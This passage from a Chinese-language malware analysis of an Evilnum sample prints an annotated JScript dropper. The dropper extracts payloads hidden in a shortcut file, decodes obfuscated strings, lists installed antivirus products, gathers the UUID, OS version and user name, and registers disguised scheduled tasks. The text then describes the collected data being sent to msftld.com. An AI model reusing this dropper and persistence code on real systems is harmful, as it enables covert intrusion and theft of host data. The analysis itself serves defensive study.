                // "uid" "devDISMWKI.tmp" "杀软列表" "系统版本号" 0 "65C36820" "用户域和用户名" 0
                // %appdata%\TortoiseGit\Plugins\Cache\GfxUIExt.exe | %localappdata%\CyberLink\PhotoMaster\promotions\PngDistil.exe
                // %appdata%\TortoiseGit\Plugins\Cache | %localappdata%\CyberLink\PhotoMaster\promotions
                // 时间 1-7天随机增加
                // PT6H
                // MaintenanceTask | StorageTiersManagementInitialization
            rsht(ar, epp, wd, sd, iv, tn);
        }
    }

    function readData(pt) {
        var ft = new ActiveXObject("ADODB.Stream");
        ft.Type = 2;
        ft.CharSet = "iso-8859-1";
        ft.Open();
        ft.LoadFromFile(pt);
        var ct = ft.ReadText(-1);
        ft.Close();
        ft = null;
        return ct;
    }

    function sr2(uid, cd, iv) {
        if (glas.length > 0) {
            var sd = new Date(cd.getTime()+(1000*60*6));

            var wd = uwd2;//localappdata\BitTorrentHelper\crashdump\dumps
            ep = tsp2;//localappdata\Microsoft\Windows\ConnectedSearches\Templates\chrmtsp.exe

            var ar = "\"" + uid + "\" -f -t";
                    // "uid" -f -t
            var tn = xsd("fRNTIiIoSC9BNCIuVDF6MVBDWg==");
                    //LibraryUpdate
            //参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
                // "uid" -f -t
                // localappdata\Microsoft\Windows\ConnectedSearches\Templates\chrmtsp.exe
                // localappdata\BitTorrentHelper\crashdump\dumps
                // 时间 +6分钟
                // iv  PT3H
                // LibraryUpdate
            rsht(ar, ep, wd, sd, iv, tn);
        }
    }

    function shp() {
        try {
            var fd = readData(lnkPath);

            if (shellObj.CurrentDirectory.toLowerCase() == xsd("Bk4EBSMiARsvARY/HAcsFyd/V2V0WHJKTA==")) {//修改当前活动目录
                                                            //c:\windows\system32
                shellObj.CurrentDirectory = tempPath;
            }

            var so = 3499;
            var ln = 144447;

            var eo = so+ln;//147946

            var t = fd.slice(so, eo);//对于lnk数据 截取3499字节后144447长度的数据

            savetoFile_("CopyIdentityLicense.jpg", xbin(t));
            WScript.Sleep(200);

            shellObj.Run("\"" + "CopyIdentityLicense.jpg" + "\"", 1, 0);
        } catch(err){}
    }

    function gdym(d) {
        var day = d.getDate().toString();
        var year = d.getFullYear().toString();
        var month = (d.getMonth() + 1).toString();

        var hour = d.getHours().toString();
        var mins = d.getMinutes().toString();
        var secs = d.getSeconds().toString();

        if (day.length < 2) {
            day = "0" + day;
        }

        if (month.length < 2) {
            month = "0" + month;
        }

        if (hour.length < 2) {
            hour = "0" + hour;
        }

        if (mins.length < 2) {
            mins = "0" + mins;
        }

        if (secs.length < 2) {
            secs = "0" + secs;
        }

        return (year + "-" + month + "-" + day + "T" + hour + ":" + mins + ":" + secs);
    }

    function ecb6(data) {
        var os = WScript.CreateObject("ADODB.Stream");
        os.Type = 2;
        os.CharSet = "us-ascii";
        os.Open();
        os.WriteText(data);
        os.Position = 0;
        os.type = 1;

        var output = os.Read;

        os.Close();

        var xmlObj = WScript.CreateObject("MSXml2.DOMDocument");

        var de = xmlObj.createElement("Base64Data");
        de.dataType = "bin.base64";
        de.nodeTypedValue = output;

        return de.text;
    }

    function rmt() {
        try {
            var fd = readData(lnkPath);

            var l = 450280;

            var eo = fd.length;
            var so = eo-l;

            var q = fd.slice(so, eo);// lnk 末尾450280 字节数据

            savetoFile_(ep2, xbin(q)); // localappdata\Microsoft\Windows\ConnectedSearches\Templates\test.exe

            FileSystemObject_.CopyFile(ep2, ep); //复制test.exe > main.exe

            FileSystemObject_.DeleteFile(ep2);// 删除test.exe 

            var uid = gudi();//获取系统UUID并异或0x42加密 转码

            var cd = new Date();
            var sd = new Date(cd.getTime()+(1000*60));

            var wd = uwd;//localappdata\Microsoft\Windows\ConnectedSearches
            var epp = tsp;//localappdata\Microsoft\Windows\ConnectedSearches\Templates\main.exe

            var eav = rdx(lvasl());//获取杀软列表，并加密 转码
            var ewv = vrs();//获取系统版本号 转码
            var edn = gudun();//获取用户域和用户名

            var ar = "-p\"29GGZr\" -sp\"\"\"" + uid + "\"\" \"\"" + fnd + "\"\" \"\"" +
                    eav + "\"\" \"\"" + ewv + "\"\" 0 \"\"" + zd + "\"\" \"\"" + edn + "\"\" " +
                    ut.toString() + "\"";
                //  -p"29GGZr" -sp"""uid"" "devDISMWKI.tmp"" ""杀软列表"" ""系统版本号"" 0 ""65C36820"" ""用户域和用户名"" 0 "
            var tn = xsd("OyQ/BjwgBTEEHz4kAiAjdkVRb1pF");
                        //ManifestUpdater
            var iv = "PT3H";
            //参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
                // -p"29GGZr" -sp"""uid"" "devDISMWKI.tmp"" ""杀软列表"" ""系统版本号"" 0 ""65C36820"" ""用户域和用户名"" 0 "
                // localappdata\Microsoft\Windows\ConnectedSearches\Templates\main.exe
                // localappdata\Microsoft\Windows\ConnectedSearches
                // 时间2
                // PT3H
                // ManifestUpdater
            rsht(ar, epp, wd, sd, iv, tn);
            // 系统UUID并异或0x42加密 转码
            // 时间1
            // 杀软列表，加密 转码
            // 系统版本号 转码
            // 用户域和用户名
                //参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
                    // "uid" "devDISMWKI.tmp" "杀软列表" "系统版本号" 0 "65C36820" "用户域和用户名" 0
                    // %appdata%\TortoiseGit\Plugins\Cache\GfxUIExt.exe | %localappdata%\CyberLink\PhotoMaster\promotions\PngDistil.exe
                    // %appdata%\TortoiseGit\Plugins\Cache | %localappdata%\CyberLink\PhotoMaster\promotions
                    // 时间 1-7天随机增加
                    // PT6H
                    // MaintenanceTask | StorageTiersManagementInitialization
            rst2ca(uid, cd, eav, ewv, edn);
            // 系统UUID并异或0x42加密 转码
            // 时间1
            // PT3H
                //参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
                    // "uid" -f -t
                    // localappdata\Microsoft\Windows\ConnectedSearches\Templates\chrmtsp.exe
                    // localappdata\BitTorrentHelper\crashdump\dumps
                    // 时间 +6分钟
                    // iv  PT3H
                    // LibraryUpdate
            sr2(uid, cd, iv);
        } catch(err) {}
    }

    function lvasl() {//获取杀软列表？
        var as = "";

        try {
            var on = xsd("IxMhWFQjIAl1aW9gCAggWkcSBx8sQEEnIAMMUF06MQhUek81M04=");
						//winmgmts:\\.\root\SecurityCenter
            var wif = xsd("I1ktCmYDEEIqM0IFBkI6F2I3WWMwag==");
					//	AntiVirusProduct
            var wmi = GetObject(on);
            var e = new Enumerator(wmi.InstancesOf(wif));

            for(; !e.atEnd(); e.moveNext()) {
                var s = e.item();

                var n = s.displayName.toLowerCase();

                glas.push(n);
                as += n + "|";
            }

            on = xsd("PwEPWhIAPBtbaylDFBoOWAExGw0CQgcEPBEiUhsZLRpTSGhhN3Vt");
					//winmgmts:\\.\root\SecurityCenter2
            wmi = GetObject(on);
            e = new Enumerator(wmi.InstancesOf(wif));

            for(; !e.atEnd(); e.moveNext()) {
                var s = e.item();

                var n = s.displayName.toLowerCase();
                if (tsid(glas, n)) {
                    continue;
                }

                glas.push(n);
                as += n + "|";
            }

            as = as.substring(0, as.length-1);
        } catch(err){}

        return as;
    }

    function vrs() {
        var on = xsd("RCQmASsrRz5yMBBobz8nAzgaUCQlGn4zTUhsTEY=");
			//	winmgmts:\\.\root\cimv2
        var wmi = GetObject(on);

        var qs = xsd("MSchAS9tQjQINh9QDQxNAj52L0I6LQIKUD0iNAlLAxYEKgtqGxEZIQFiYm1EbDk=");
			//	SELECT Version FROM Win32_OperatingSystem
        var items = wmi.ExecQuery(qs, "WQL", 0x30);

        var eit = new Enumerator(items);

        var wv = "";

        for (; !eit.atEnd(); eit.moveNext()) {
            var it = eit.item();
            wv = it.Version;
            break;
        }

        if (!wv) {
            return "";
        }

        return encodeURIComponent(ecb6(wv));
    }

    function ias2a() {//检测是否有AVG/Avast 
        try {
            if (glas.length == 0) {
                return false
            }

            var s = xsd("Dx5ZCxJuaDh4Zng=");
                //avast
            var g = xsd("UgwCM3plZzJH");
                //avg
            for (var i=0 ; i<glas.length ; ++i) {
                var a = glas[i];

                if (a.indexOf(s) != -1 || a.indexOf(g) != -1) {
                    return true
                }
            }
        } catch(e) {}

        return false;
    }

    function savetoFile_(pt, ct) {
        var ft = new ActiveXObject("ADODB.Stream");
        ft.Type = 2;
        ft.CharSet = "iso-8859-1";
        ft.Open();
        ft.WriteText(ct);
        ft.SaveToFile(pt, 2);//覆盖模式
        ft.Close();
        ft = null;
    }

    function rsht(ar, ep, wd, sd, iv, tn) {//参数，程序路径，工作目录，开始时间，每次重新启动任务之间的时间，任务名称
        try {
            var ts = WScript.CreateObject("Schedule.Service");//创建计划任务
            ts.Connect();

            var rf = ts.GetFolder("\\");
            var tf = ts.NewTask(0); //任务对象

            var ri = tf.RegistrationInfo;//定义描述任务的信息
            ri.Description = "";
            ri.Author = "";

            var tst = tf.Settings;//定义用于确定任务计划程序服务如何执行任务的设置
            tst.Enabled = true;//启用
            tst.StartWhenAvailable = true;//可以在计划时间过去之后的任何时间启动任务
            tst.Hidden = false;//任务将在UI中不可见

            var tt = tf.Triggers;//创建基于时间的触发器

            var tr = tt.Create(1);//一天的特定时间触发任务
            tr.StartBoundary = gdym(sd);//开始时间
            tr.Enabled = true;//启用
            tr.Repetition.Interval = iv;//该值指示任务运行的频率以及任务启动后重复执行重复模式的时间
                                        // 每次重新启动任务之间的时间

            var ta = tf.Actions.Create(0);//为要执行的任务创建一个动作
                                        //该操作执行命令行操作
            ta.Path = ep; //要运行的程序的路径
            ta.Arguments = ar; //参数

            ta.WorkingDirectory = wd;//工作目录
            //任务名称
            //已注册任务的定义
            rf.RegisterTaskDefinition(tn, tf, 6, "","", 3);

            return true;
        } catch(ex) {}

        return false;
    }

    function xsd(bes) {
        var es = dcb6(bes);

        var esl = es.length;

        var k = es.substring(esl-6);
        var s = es.substring(0, esl-6);

        var ds = "";

        for (var i=0 ; i<s.length ; ++i) {
            var sc = s.charCodeAt(i);
            var kc = k.charCodeAt(i % k.length);
            var xc = String.fromCharCode(sc ^ kc);

            ds += xc;
        }

        return ds;
    }

    function CopyFile_wtp() {
        try {
            if (FileSystemObject_.FolderExists(mwd)) {// localappdata\Microsoft\Windows\ConnectedSearches\Templates
                FileSystemObject_.DeleteFolder(mwd, true);
            }
        } catch(ex) {}

        try {
            if (!FileSystemObject_.FolderExists(uwd)) {// //localappdata\Microsoft\Windows\ConnectedSearches
                FileSystemObject_.CreateFolder(uwd);
            }
        } catch(ex) {}

        try {
            FileSystemObject_.CreateFolder(mwd); // localappdata\Microsoft\Windows\ConnectedSearches\Templates
        } catch(e) {}

        var ic = false;
        while (!ic) {
            try {
                FileSystemObject_.CopyFile(WScript.ScriptFullName, wtp); ////localappdata\Microsoft\Windows\ConnectedSearches\Templates\wct02CJI0.dat
                ic = true;
            } catch(err) {}
        }
    }

    function gudun() {//获取用户域和用户名
        var ud = shellObj.ExpandEnvironmentStrings("%USERDOMAIN%");
        var un = shellObj.ExpandEnvironmentStrings("%USERNAME%");

        return rdx(ud + "\\" + un);
    }
})();


```

## 计划任务

计划任务中的main.exe实质上为一个带密码（29GGZr）的自解压文件，打开后如下图所示：

![image-20210131232928993](/pic/sunyu/EVILNUMA/image-20210131232928993.png)

main.exe运行后解压并运行RdrCER.exe,将UUID，杀软列表，系统版本等信息作为参数传给RdrCER.exe，RdrCER.exe再将其传给msftld.com

![image-20210131233644314](/pic/sunyu/EVILNUMA/image-20210131233644314.png)

# 总结

Evilnum系列样本的主要通过快捷方式来进行隐藏，从而诱导用户点击执行恶意脚本

因为将全部数据保存在了快捷方式中导致整体体积很大，与平常常见的不到1kb快捷方式差异明显。日常防护可以从这个角度考虑。